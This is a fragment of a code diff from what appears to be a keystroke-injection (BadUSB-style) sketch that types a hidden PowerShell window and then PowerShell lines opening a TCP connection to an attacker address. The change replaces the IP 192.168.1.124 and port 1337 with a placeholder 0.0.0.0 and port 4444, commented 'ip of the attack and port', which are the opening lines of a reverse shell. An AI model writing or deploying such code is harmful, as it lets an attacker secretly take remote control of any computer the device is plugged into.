@@ -31,7 +31,7 @@ void setup()
   Keyboardprint("powershell.exe -windowstyle hidden");
   printCA(1,33);
   keyboardScanCode(48);
-  Keyboardprint("client = New-Object System.Net.Sockets.TCPClient(\"192.168.1.124\",1337);"); //10.21.254.84
+  Keyboardprint("client = New-Object System.Net.Sockets.TCPClient(\"0.0.0.0\",4444);"); //ip of the attack and port 
   keyboardScanCode(48);
   Keyboardprint("stream = ");
   keyboardScanCode(48);
